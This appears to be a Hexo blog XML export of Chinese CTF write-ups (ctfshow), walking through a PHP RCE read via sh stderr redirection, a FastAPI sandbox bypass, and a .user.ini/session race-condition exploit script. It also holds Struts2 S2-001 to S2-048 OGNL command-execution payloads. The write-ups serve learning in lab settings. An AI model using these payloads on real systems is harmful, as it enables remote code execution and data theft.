    <content><![CDATA[<h2 id="原谅4"><a href="#原谅4" class="headerlink" title="原谅4"></a>原谅4</h2><p>源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;xbx&#x27;</span>])?<span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;xbx&#x27;</span>]):<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>

<p>发现xbx可以rce</p>
<p>ls 发现</p>
<p>index.php yuanliang_4_xxx.zip</p>
<p>并且flag在&#x2F;目录里面</p>
<p>直接cat发现不行</p>
<p>我们ls &#x2F;bin目录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/bin 目录是 Unix/Linux 系统中的一个重要目录,它存放着许多常用的可执行文件(二进制文件)。这些文件通常是系统管理员或普通用户经常使用的基本命令和应用程序</span><br></pre></td></tr></table></figure>

<p>最终发现sh rm ls 这三个命令可以执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sh是一个轻量级的shell,相比于bash等更高级的shell,它提供了更基础的功能。但它仍然是许多系统管理任务的首选shell。</span><br></pre></td></tr></table></figure>

<p>明显让我们用sh来做题目</p>
<p>sh也可以像cat一样读取文件内容但是有一点不同</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@iZbp1g5j7wkdznqpfv918wZ ctf]# cat Gu0f3n.txt</span><br><span class="line">Gu0f3n</span><br><span class="line">[root@iZbp1g5j7wkdznqpfv918wZ ctf]# sh Gu0f3n.txt</span><br><span class="line">Gu0f3n.txt: line 1: Gu0f3n: command not found</span><br></pre></td></tr></table></figure>

<p>他会报错 command not found</p>
<p>因为当命令不被正常执行则会报错</p>
<p>这里我们可以用linux重定向错误输出</p>
<p>我们都知道在文件描述符中0，1，2 分表示标准输入，标准输出，标准错误输出</p>
<p>其次我们需要了解规律</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.标准输入0、输出1、错误2需要分别重定向，一个重定向只能改变它们中的一个</span><br><span class="line">2. 标准输入0和标准输出1可以省略。（当其出现重定向符号左侧时）  </span><br><span class="line">3. 文件描述符在重定向符号左侧时直接写即可，在右侧时前面加&amp; </span><br><span class="line">4.  文件描述符与重定向符号之间不能有空格</span><br></pre></td></tr></table></figure>

<p>参考文章：<a href="https://blog.csdn.net/weixin_29491885/article/details/111050189">https://blog.csdn.net/weixin_29491885/article/details/111050189</a></p>
<p>那么这道题目我们</p>
<p>用sh读取&#x2F;flag的内容将他的报错输出</p>
<p>sh &#x2F;flag 2&gt;%261</p>
<p>需要姜&amp;url编码为%26</p>
<p>paylod:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xbx=sh%20/flag%202&gt;%261</span><br></pre></td></tr></table></figure>



<h2 id="原谅5-fastapi2"><a href="#原谅5-fastapi2" class="headerlink" title="原谅5_fastapi2"></a>原谅5_fastapi2</h2><p>打开题目</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;“你好”：“fastapi2”&#125;</span><br></pre></td></tr></table></figure>

<p>fast api2</p>
<p>首先就是了解fastapi2这个东西</p>
<p>FastAPI 是一个现代、快速（高性能）的 Web 框架，用于构建基于 Python 的 **<a href="https://apifox.com/apiskills/understanding-apis/">API</a>**。它是一个开源项目，基于 Starlette 和 Pydantic 库构建而成，提供了强大的功能和高效的性能。</p>
<p>在 FastAPI 中，<code>/docs</code> 路由提供了一个自动生成的交互式 API 文档界面。这是 FastAPI 的一个非常有用的特性，用于查看和测试 API 的各个端点</p>
<p>在更具题目给的提示</p>
<p>进入路由</p>
<p>发现三个函数</p>
<p>其中第二个calc</p>
<p>根据提示给的黑名单</p>
<p>我们展示全局变量</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">list</span>(<span class="built_in">globals</span>())</span><br></pre></td></tr></table></figure>

<p><img src="/imgs/3.png"></p>
<p>发现可疑的变量youdontknow</p>
<p>展示这个变量发现一堆过滤得到关键词</p>
<p>我们用</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">youdontknow.clear()</span><br></pre></td></tr></table></figure>

<p>clear掉过滤的关键词语</p>
<p>最后直接读flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">open</span>(<span class="string">&#x27;/flag&#x27;</span>).read()</span><br></pre></td></tr></table></figure>

<p><img src="/imgs/4.png"></p>
<h3 id="fastapi2-for-阿狸"><a href="#fastapi2-for-阿狸" class="headerlink" title="fastapi2 for 阿狸"></a>fastapi2 for 阿狸</h3><p><strong>和5一样</strong></p>
<p>clear掉</p>
<p>嗨嗨</p>
<h2 id="原谅6-web3"><a href="#原谅6-web3" class="headerlink" title="原谅6_web3"></a>原谅6_web3</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;waf.php&#x27;</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>] ?? <span class="literal">NULL</span>;</span><br><span class="line"><span class="variable">$content</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>] ?? <span class="literal">NULL</span>;</span><br><span class="line">(<span class="title function_ invoke__">waf_file</span>(<span class="variable">$file</span>)&amp;&amp;<span class="title function_ invoke__">waf_content</span>(<span class="variable">$content</span>))?(<span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>,<span class="variable">$content</span>)):<span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure>

<p>简单来说就是你输进去的文件不在waf的绕过里面就可以了</p>
<p>绕过的东西很多但是没有绕过**.user.ini**</p>
<p>.user.ini 文件是<strong>PHP 中用于配置特定目录的设置的特殊文件</strong>。 它类似于Apache 服务器中的 . htaccess 文件，但仅适用于PHP。 .user.ini 文件允许用户为特定目录定义PHP 配置指令，这些配置指令将在该目录及其所有子目录中的PHP 脚本执行时生效。</p>
<p><code>.user.ini</code> 文件的主要目的是为了允许非管理员用户自定义某些 PHP 配置选项，而不需要访问主 <code>php.ini</code> 文件。这样，不同的应用程序或用户可以在自己的目录中设置特定的 PHP 配置，而不影响整个服务器的配置。</p>
<p>这里的考点就是session和.user.ini的条件竞争</p>
<p>参考文章：<a href="https://www.freebuf.com/vuls/202819.html">https://www.freebuf.com/vuls/202819.html</a></p>
<p><strong>auto_prepend_file 表示在php程序加载应用程序前加载指定的php文件</strong></p>
<p>GET：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=.user.ini</span><br></pre></td></tr></table></figure>

<p>POST:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">auto_prepend_file=/tmp/sess_Gu0f3n</span><br></pre></td></tr></table></figure>

<p>然后用下大佬的脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="comment"># Author：Y4tacker</span></span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">sessid = <span class="string">&#x27;Gu0f3n&#x27;</span></span><br><span class="line">url = <span class="string">&quot;http://c41b9ab0-e1f5-4e05-b75c-a7ea64fa3d91.challenge.ctf.show/&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line">        resp = session.post(url,</span><br><span class="line">                            data=&#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&quot;&lt;?php system(&#x27;cat ./flag.php&#x27;);?&gt;&quot;</span>&#125;,</span><br><span class="line">                            files=&#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;Gu0f3n.txt&#x27;</span>, f)&#125;, cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: sessid&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        resp = session.get(url+<span class="string">&quot;waf.php&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;upload_progress&quot;</span> <span class="keyword">in</span> resp.text:</span><br><span class="line">            <span class="built_in">print</span>(resp.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    event = threading.Event()</span><br><span class="line">    <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="comment"># 第一步上传.user.ini文件，将我们的session文件内容添加到默认头</span></span><br><span class="line">        y4tacker = &#123;</span><br><span class="line">            <span class="string">&quot;content&quot;</span>: <span class="string">&quot;auto_prepend_file=/tmp/sess_&quot;</span> + sessid</span><br><span class="line">        &#125;</span><br><span class="line">        session.post(url + <span class="string">&quot;?file=.user.ini&quot;</span>, data=y4tacker)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=write, args=(session,)).start()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=read, args=(session,)).start()</span><br><span class="line">    event.<span class="built_in">set</span>()</span><br></pre></td></tr></table></figure>

<p>结果</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//$flag=&#x27;ctfshow&#123;d78ac2f0-9b57-4159-a162-6b944e7b495b&#125;&#x27;;</span><br><span class="line">|a:5:&#123;s:10:&quot;start_time&quot;;i:1721961458;s:14:&quot;content_length&quot;;i:51487;s:15:&quot;bytes_processed&quot;;i:5259;s:4:&quot;done&quot;;b:0;s:5:&quot;files&quot;;a:1:&#123;i:0;a:7:&#123;s:10:&quot;field_name&quot;;s:4:&quot;file&quot;;s:4:&quot;name&quot;;s:10:&quot;Gu0f3n.txt&quot;;s:8:&quot;tmp_name&quot;;N;s:5:&quot;error&quot;;i:0;s:4:&quot;done&quot;;b:0;s:10:&quot;start_time&quot;;i:1721961458;s:15:&quot;bytes_processed&quot;;i:5259;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>ctfshow</category>
      </categories>
      <tags>
        <tag>复现</tag>
      </tags>
  </entry>
  <entry>
    <title>python基础学习</title>
    <url>/2024/09/11/python%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>java study</title>
    <url>/2024/09/04/study/</url>
    <content><![CDATA[<h2 id="web279"><a href="#web279" class="headerlink" title="web279"></a>web279</h2><p>点进去发现一个登录框</p>
<p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/image_12.png"></p>
<p>没思路 看wp</p>
<p>了解下</p>
<p>Struts2是用Java语言编写的一个基于MVC设计模式的Web应用框架</p>
<p>描述：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">struts2漏洞 S2-001是当用户提交表单数据且验证失败时，服务器使用OGNL表达式解析用户先前提交的参数值，%&#123;value&#125;并重新填充相应的表单数据。例如，在注册或登录页面中。如果提交失败，则服务器通常默认情况下将返回先前提交的数据。由于服务器用于%&#123;value&#125;对提交的数据执行OGNL表达式解析，因此服务器可以直接发送有效载荷来执行命令。</span><br></pre></td></tr></table></figure>

<p>在这里提到了 OGNL 表达式</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">OGNL（Object-Graph Navigation Language）是一种用于在Java应用程序中访问和操作对象图的表达式语言。OGNL最初是由Drew Davidson和Luke Blanshard开发的，主要用于Java的对象属性访问和修改，类似于其他表达式语言如JSTL、EL等。OGNL表达式可以用来简化对复杂对象结构的访问和操作，非常适合于MVC框架中绑定表单数据到模型对象的场景</span><br></pre></td></tr></table></figure>

<h3 id="OGNL-表达式的基本功能"><a href="#OGNL-表达式的基本功能" class="headerlink" title="OGNL 表达式的基本功能"></a>OGNL 表达式的基本功能</h3><ol>
<li><ol>
<li><strong>对象属性访问</strong>：使用<code>.</code>（点号）访问对象的属性。例如，<code>person.name</code> 可以获取<code>person</code>对象的<code>name</code>属性。</li>
<li><strong>集合和数组访问</strong>：OGNL 支持通过索引访问集合和数组中的元素。例如，<code>list[0]</code> 可以访问列表中的第一个元素。</li>
<li><strong>方法调用</strong>：OGNL 可以调用对象的方法。例如，<code>person.getName()</code> 可以调用<code>person</code>对象的<code>getName()</code>方法。</li>
<li><strong>操作符支持</strong>：OGNL 支持多种操作符，例如算术操作符（<code>+</code>, <code>-</code>, <code>*</code>, <code>/</code>），逻辑操作符（<code>&amp;&amp;</code>, <code>||</code>），比较操作符（<code>==</code>, <code>!=</code>, <code>&gt;</code>, <code>&lt;</code>）等。</li>
<li><strong>上下文变量</strong>：OGNL 支持通过 <code>#</code> 访问上下文变量。例如，<code>#root</code> 访问当前的根对象，<code>#this</code> 访问当前的对象。</li>
<li><strong>表达式求值</strong>：可以使用OGNL表达式直接求值或进行复杂的逻辑运算。</li>
</ol>
</li>
</ol>
<p>我们在这里简单的了解下这个表达式</p>
<p>如何分辨这种类型的漏洞的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.常见的action.do后缀结尾</span><br><span class="line">2.user!list.action带感叹号式</span><br><span class="line">3.test?actionErrors=11111111111404/500响应并目页面打印11111111111</span><br><span class="line">4.后缀不带action do，不能说明不是struts2</span><br></pre></td></tr></table></figure>

<p>s2-001是一个struts2命令执行漏洞编号，漏洞介绍：<a href="https://www.freebuf.com/column/224041.html">https://www.freebuf.com/column/224041.html</a></p>
<p>漏洞部分代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">translateVariables</span><span class="params">(<span class="type">char</span> open, String expression, ValueStack stack, Class asType, TextParseUtil.ParsedValueEvaluator evaluator)</span> &#123;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> expression;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">start</span> <span class="operator">=</span> expression.indexOf(open + <span class="string">&quot;&#123;&quot;</span>);</span><br><span class="line">        <span class="type">int</span> <span class="variable">length</span> <span class="operator">=</span> expression.length();</span><br><span class="line">        <span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> start + <span class="number">2</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(start != -<span class="number">1</span> &amp;&amp; x &lt; length &amp;&amp; count != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="type">char</span> <span class="variable">c</span> <span class="operator">=</span> expression.charAt(x++);</span><br><span class="line">            <span class="keyword">if</span> (c == <span class="string">&#x27;&#123;&#x27;</span>) &#123;</span><br><span class="line">                ++count;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (c == <span class="string">&#x27;&#125;&#x27;</span>) &#123;</span><br><span class="line">                --count;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">end</span> <span class="operator">=</span> x - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (start == -<span class="number">1</span> || end == -<span class="number">1</span> || count != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> XWorkConverter.getInstance().convertValue(stack.getContext(), result, asType);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">var</span> <span class="operator">=</span> expression.substring(start + <span class="number">2</span>, end);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> stack.findValue(<span class="keyword">var</span>, asType);</span><br><span class="line">        <span class="keyword">if</span> (evaluator != <span class="literal">null</span>) &#123;</span><br><span class="line">            o = evaluator.evaluate(o);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">left</span> <span class="operator">=</span> expression.substring(<span class="number">0</span>, start);</span><br><span class="line">        <span class="type">String</span> <span class="variable">right</span> <span class="operator">=</span> expression.substring(end + <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> (o != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (TextUtils.stringSet(left)) &#123;</span><br><span class="line">                result = left + o;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                result = o;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (TextUtils.stringSet(right)) &#123;</span><br><span class="line">                result = result + right;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            expression = left + o + right;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            result = left + right;</span><br><span class="line">            expression = left + right;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="comment">//这段代码的核心流程就是不断在 expression 中查找占位符 &#123;&#125;，解析变量并替换成对应的值。如果提供了 evaluator，还会对找到的值进一步处理。最终返回的结果是替换后的完整字符串或对象，并且可以根据需要转换成指定类型。</span></span><br></pre></td></tr></table></figure>



<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="variable">start</span> <span class="operator">=</span> expression.indexOf(open + <span class="string">&quot;&#123;&quot;</span>);<span class="comment">//尝试在字符串 expression 中找到一个复合字符串的起始位置，该复合字符串是由变量 open 和 &quot;&#123;&quot; 组合而成的。</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> stack.findValue(<span class="keyword">var</span>, asType);</span><br></pre></td></tr></table></figure>

<p>简单来说就是你输出给password的是OGNL 表达式 这样一大串代码会直接执行你的代码</p>
<p>例如我们执行一个**%{1-1}**</p>
<p>发现回显一个0</p>
<p>根据上面的OGNL 表达的用法（用下wp的payload）参考：<a href="https://blog.csdn.net/q20010619/article/details/120729447">https://blog.csdn.net/q20010619/article/details/120729447</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 获取tomcat路径</span><br><span class="line">%&#123;&quot;tomcatBinDir&#123;&quot;+@java.lang.System@getProperty(&quot;user.dir&quot;)+&quot;&#125;&quot;&#125;</span><br><span class="line"></span><br><span class="line">// 获取web路径</span><br><span class="line">%&#123;#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(),#response.println(#req.getRealPath(&#x27;/&#x27;)),#response.flush(),#response.close()&#125;</span><br><span class="line"></span><br><span class="line">// 命令执行 env，flag就在其中</span><br><span class="line">password=%&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;env&quot;&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;&amp;username=1</span><br></pre></td></tr></table></figure>



<p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/image_11.png"></p>
<h2 id="web280"><a href="#web280" class="headerlink" title="web280"></a>web280</h2><p>这个漏洞有个检测工具后</p>
<p>下载地址：<a href="https://github.com/abc123info/Struts2VulsScanTools/releases">https://github.com/abc123info/Struts2VulsScanTools/releases</a></p>
<p>S2-003</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Struts2将HTTP的每个参数名解析为ognl语句执行,而ognl表达式是通过#来访问struts的对象，Struts2框架虽然过滤了#来进行过滤，但是可以通过unicode编码（u0023）或8进制（43）绕过了安全限制，达到代码执行的效果</span><br><span class="line"></span><br><span class="line">影响版本：Struts 2.0.0 - Struts 2.0.11.2</span><br></pre></td></tr></table></figure>

<p>S2-005</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">S2-005和S2-003的原理是类似的，因为官方在修补S2-003不全面，导致用户可以绕过官方的安全配置（禁止静态方法调用和类方法执行），再次造成的漏洞，可以说是升级版的S2-005是升级版的S2-003</span><br></pre></td></tr></table></figure>

<p>Struts2框架在处理表单数据时，会将表单数据绑定到Action对象的相应属性上。攻击者可以通过在表单中提交特定的字符串，从而绕过Struts2的安全过滤机制，直接执行任意代码</p>
<p>工具展示</p>
<p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/image_17.png"></p>
<h2 id="web281"><a href="#web281" class="headerlink" title="web281"></a>web281</h2><p>工具解决即可</p>
<p>了解下漏洞S2-007</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">当用户提交 age 为字符串而非整形数值时，后端用代码拼接 &quot;&#x27;&quot; + value + &quot;&#x27;&quot; 然后对其进行 OGNL 表达式解析。要成功利用，只需要找到一个配置了类似验证规则的表单字段使之转换出错，借助类似 SQLi 注入单引号拼接的方式即可注入任意 OGNL 表达式。</span><br></pre></td></tr></table></figure>

<p>age 框执行了命令</p>
<h2 id="web282"><a href="#web282" class="headerlink" title="web282"></a>web282</h2><p>S2-008 涉及多个漏洞，Cookie 拦截器错误配置可造成 OGNL 表达式执行，但是由于大多 Web 容器（如 Tomcat）对 Cookie 名称都有字符限制，一些关键字符无法使用使得这个点显得比较鸡肋。另一个比较鸡肋的点就是在 struts2 应用开启 devMode 模式后会有多个调试接口能够直接查看对象信息或直接执行命令，正如 kxlzx 所提这种情况在生产环境中几乎不可能存在，因此就变得很鸡肋的，但我认为也不是绝对的，万一被黑了专门丢了一个开启了 debug 模式的应用到服务器上作为后门也是有可能的。<br>姿势1：cookie</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Cookie:(&#x27;#_memberAccess.setAllowStaticMethodAccess(true)&#x27;)(1)(2)=Aluvion; (&#x27;@java.lang.Runtime@getRuntime().exec(&quot;calc&quot;)&#x27;)(1)(2)=Twings;</span><br></pre></td></tr></table></figure>

<p>姿势2：调试模式</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">devmode.action?debug=command&amp;expression=(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false%22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27env%27%29.getInputStream%28%29%29)</span><br></pre></td></tr></table></figure>

<h2 id="web283"><a href="#web283" class="headerlink" title="web283"></a>web283</h2><p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/image_18.png"></p>
<p>漏洞原理：</p>
<p>Struts2对s2-003的修复方法是禁止静态方法调用，在s2-005中可直接通过OGNL绕过该限制，对于#号，同样使用编码\u0023或\43进行绕过；于是Struts2对s2-005的修复方法是禁止\等特殊符号，使用户不能提交反斜线。</p>
<p>但是，如果当前action中接受了某个参数example，这个参数将进入OGNL的上下文。所以，我们可以将OGNL表达式放在example参数中，然后使用&#x2F;helloword.acton?example&#x3D;<OGNL statement>&amp;(example)(‘xxx’)&#x3D;1的方法来执行它，从而绕过官方对#、\等特殊字符的防御。</p>
<p>访问<a href="http://your-ip:8080/ajax/example5.action%E5%8D%B3%E5%8F%AF%E8%AE%BF%E9%97%AE%E8%AF%A5%E6%8E%A7%E5%88%B6%E5%99%A8%E3%80%82%E6%8C%89%E7%85%A7%E5%8E%9F%E7%90%86%E4%B8%AD%E8%AF%B4%E5%88%B0%E7%9A%84%E6%96%B9%E6%B3%95%EF%BC%8C%E5%B0%86OGNL%E5%88%A9%E7%94%A8%E4%BB%A3%E7%A0%81%E6%94%BE%E5%9C%A8name%E5%8F%82%E6%95%B0%E9%87%8C">http://your-ip:8080/ajax/example5.action即可访问该控制器。按照原理中说到的方法，将OGNL利用代码放在name参数里</a></p>
<p>poc</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?age=12313&amp;name=%28%23context[%22xwork.MethodAccessor.denyMethodExecution%22]%3D+new+java.lang.Boolean%28false%29,%20%23_memberAccess[%22allowStaticMethodAccess%22]%3d+new+java.lang.Boolean%28true%29,%20@java.lang.Runtime@getRuntime%28%29.exec%28%27touch%20/tmp/success%27%29%29%28meh%29&amp;z[%28name%29%28%27meh%27%29]=true</span><br></pre></td></tr></table></figure>

<p>工具直接出</p>
<h2 id="web284"><a href="#web284" class="headerlink" title="web284"></a>web284</h2><p>由url可以得知漏洞是S2-012</p>
<p>漏洞原理：</p>
<p>如果在配置 Action 中 Result 时使用了重定向类型，并且还使用 ${param_name} 作为重定向变量，例如：、</p>
<package name="S2-012" extends="struts-default">
    <action name="user" class="com.demo.action.UserAction">
        <result name="redirect" type="redirect">/index.jsp?name=${name}</result>
        <result name="input">/index.jsp</result>
        <result name="success">/index.jsp</result>
    </action>
</package>
这里 UserAction 中定义有一个 name 变量，当触发 redirect 类型返回时，Struts2 获取使用 ${name} 获取其值，在这个过程中会对 name 参数的值执行 OGNL 表达式解析，从而可以插入任意 OGNL 表达式导致命令执行。

<p>poc：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;cat&quot;, &quot;/etc/passwd&quot;&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="web285"><a href="#web285" class="headerlink" title="web285"></a>web285</h2><p>Struts2 标签中 &lt;s:a&gt; 和 &lt;s:url&gt; 都包含一个 includeParams 属性，其值可设置为 none，get 或 all，参考官方其对应意义如下：</p>
<p>none - 链接不包含请求的任意参数值（默认）<br>get - 链接只包含 GET 请求中的参数和其值<br>all - 链接包含 GET 和 POST 所有参数和其值<br>&lt;s:a&gt;用来显示一个超链接，当includeParams&#x3D;all的时候，会将本次请求的GET和POST参数都放在URL的GET参数上。在放置参数的过程中会将参数进行OGNL渲染，造成任意命令执行漏洞。<br>poc：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#123;(#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,#a=@java.lang.Runtime@getRuntime().exec(&#x27;id&#x27;).getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[50000],#c.read(#d),#out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#out.println(#d),#out.close())&#125;</span><br><span class="line"></span><br><span class="line">// 或</span><br><span class="line"></span><br><span class="line">$&#123;#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#x27;id&#x27;).getInputStream())&#125;</span><br></pre></td></tr></table></figure>

<p>感觉工具都能直接写出来 后面的就不写了</p>
<h1 id="web295-S2-048"><a href="#web295-S2-048" class="headerlink" title="web295:S2-048"></a>web295:S2-048</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">poc:%&#123;(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#x27;id&#x27;).getInputStream())).(#q)&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>ctfshow</category>
      </categories>
      <tags>
        <tag>复现</tag>
      </tags>
  </entry>
  <entry>
    <title>反弹shell的实验</title>
    <url>/2024/07/18/%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E5%AE%9E%E9%AA%8C/</url>
    <content><![CDATA[<h1 id="反弹shell实验"><a href="#反弹shell实验" class="headerlink" title="反弹shell实验"></a>反弹shell实验</h1><p>之前国赛ciscn2024坐牢</p>
<p>web题目简直难如登天</p>
